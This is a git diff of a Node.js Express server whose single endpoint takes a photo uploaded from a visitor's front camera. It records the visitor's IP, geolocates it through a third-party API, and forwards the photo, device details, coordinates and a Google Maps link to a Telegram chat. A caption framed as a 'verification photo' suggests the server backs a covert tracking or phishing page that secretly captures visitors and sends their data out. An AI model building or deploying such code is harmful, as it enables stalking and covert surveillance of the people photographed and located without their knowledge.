@@ -1,4 +1,3 @@
-// server.js - Express server: serve static + proxy Telegram
 const express = require("express");
 const multer = require("multer");
 const path = require("path");
@@ -6,79 +5,65 @@ const path = require("path");
 const app = express();
 const upload = multer({
   storage: multer.memoryStorage(),
-  limits: { fileSize: 10 * 1024 * 1024 }, // 10MB
+  limits: { fileSize: 15 * 1024 * 1024 },
 });
 
 app.use(express.json({ limit: "2mb" }));
+app.use(express.static(__dirname, { extensions: ["html"] }));
 
-// Serve static files (index.html, main.js, ...)
-app.use(
-  express.static(__dirname, {
-    extensions: ["html"],
-    setHeaders: (res, filePath) => {
-      if (filePath.endsWith(".html")) {
-        res.setHeader("Cache-Control", "no-cache");
-      }
-    },
-  }),
-);
-
-// Health check (Render ping để biết service còn sống)
 app.get("/healthz", (_, res) => res.status(200).send("ok"));
 
-// ============ API PROXY TELEGRAM ============
+app.get("/api/health", (_, res) => {
+  res.json({
+    hasToken: !!process.env.TELEGRAM_BOT_TOKEN,
+    hasChatId: !!process.env.TELEGRAM_CHAT_ID,
+    node: process.version,
+  });
+});
+
 app.post("/api/tele-proxy", upload.single("front"), async (req, res) => {
   const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
   const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
   if (!TOKEN || !CHAT_ID) {
     return res.status(500).json({
+      success: false,
       error: "Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID",
     });
   }
 
   try {
-    // 1. Lấy IP người dùng (Render có x-forwarded-for)
     const userIP =
       (req.headers["x-forwarded-for"] || "").split(",")[0].trim() ||
       req.socket.remoteAddress ||
       "Unknown";
 
-    // 2. Tra cứu vị trí địa lý (timeout 4s để không treo request)
     let geo = {};
     try {
       const geoRes = await fetch(`https://freeipapi.com/api/json/${userIP}`, {
         signal: AbortSignal.timeout(4000),
       });
       if (geoRes.ok) geo = await geoRes.json();
-    } catch (_) {
-      geo = {};
-    }
+    } catch (_) {}
 
     const lat = geo.latitude ?? "0";
     const lon = geo.longitude ?? "0";
     const address = `${geo.cityName || "Unknown"}, ${geo.regionName || "Unknown"}, ${geo.countryName || "Unknown"}`;
 
-    // 3. Parse clientInfo
     let clientData = {};
     try {
       clientData = JSON.parse(req.body.clientInfo || "{}");
-    } catch (_) {
-      clientData = {};
-    }
+    } catch (_) {}
 
-    // 4. Chỉ gửi khi có ảnh
-    const file = req.file;
-    if (!file || !file.buffer) {
-      return res.status(200).json({
+    if (!req.file || !req.file.buffer || req.file.size === 0) {
+      return res.status(400).json({
         success: false,
-        message: "No photo captured, skipped sending.",
+        error: "No photo file received",
       });
     }
 
-    // 5. Tạo caption
-    const finalCaption = `
-📡 [THÔNG TIN TRUY CẬP & ẢNH XÁC THỰC]
+    const caption = `
+📡 [ẢNH XÁC THỰC MỚI]
 
 🕒 Thời gian: ${clientData.time || new Date().toLocaleString("vi-VN")}
 📱 Thiết bị: ${clientData.device || "Unknown"}
@@ -89,19 +74,16 @@ app.post("/api/tele-proxy", upload.single("front"), async (req, res) => {
 🌎 Quốc gia: ${geo.countryName || "Unknown"}
 📍 Vĩ độ: ${lat}
 📍 Kinh độ: ${lon}
-📌 Google Maps: https://www.google.com/maps?q=${lat},${lon}
+📌 Maps: https://www.google.com/maps?q=${lat},${lon}
 📸 Camera: ${clientData.camera || "✅ Đã chụp"}
-
-⚠️ Thông tin có thể chưa chính xác 100%.
 `.trim();
 
-    // 6. Gửi Telegram sendPhoto
     const teleForm = new FormData();
     teleForm.append("chat_id", CHAT_ID);
-    teleForm.append("caption", finalCaption);
+    teleForm.append("caption", caption);
     teleForm.append(
       "photo",
-      new Blob([file.buffer], { type: file.mimetype || "image/jpeg" }),
+      new Blob([req.file.buffer], { type: req.file.mimetype || "image/jpeg" }),
       "front.jpg",
     );
 
@@ -110,23 +92,28 @@ app.post("/api/tele-proxy", upload.single("front"), async (req, res) => {
       {
         method: "POST",
         body: teleForm,
-        signal: AbortSignal.timeout(15000),
+        signal: AbortSignal.timeout(20000),
       },
     );
 
     const teleData = await teleRes.json().catch(() => ({}));
 
-    return res.status(200).json({
-      success: teleRes.ok && teleData.ok === true,
-      telegram: teleData,
-    });
+    if (!teleData.ok) {
+      return res.status(500).json({
+        success: false,
+        error: teleData.description || "Telegram error",
+      });
+    }
+
+    return res.status(200).json({ success: true });
   } catch (err) {
-    console.error("[tele-proxy] error:", err);
-    return res.status(500).json({ error: err.message });
+    return res.status(500).json({
+      success: false,
+      error: err.message,
+    });
   }
 });
 
-// Fallback SPA (nếu cần)
 app.get("*", (req, res, next) => {
   if (req.path.startsWith("/api/")) return next();
   res.sendFile(path.join(__dirname, "index.html"));
@@ -134,5 +121,7 @@ app.get("*", (req, res, next) => {
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, "0.0.0.0", () => {
-  console.log(`🚀 Server running on port ${PORT}`);
+  console.log(`🚀 Server on port ${PORT}`);
+  console.log(`Token loaded: ${!!process.env.TELEGRAM_BOT_TOKEN}`);
+  console.log(`ChatID loaded: ${!!process.env.TELEGRAM_CHAT_ID}`);
 });
